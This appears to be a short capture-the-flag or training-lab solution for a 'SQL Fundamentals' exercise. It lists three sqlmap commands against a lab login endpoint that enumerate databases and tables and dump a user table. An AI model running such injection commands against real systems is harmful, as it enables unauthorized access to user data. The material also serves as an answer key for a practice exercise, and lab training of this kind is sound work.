# Activity performed as part of SQL Fundamentals

- **Pre-requisite** :
1. Start both the attack machine and the target machine provided.

- **Practical**: 
Use the following command to get the solution for the Practical section questions:
1. sqlmap -u 'http://10.10.180.12/ai/includes/user_login?email=test&password=123' --dbs --level=5
2. sqlmap -u 'http://10.10.180.12/ai/includes/user_login?email=test&password=123' -D ai --tables --level=5
3. sqlmap -u 'http://10.10.180.12/ai/includes/user_login?email=test&password=123' -D ai -T user --dump  --level=5
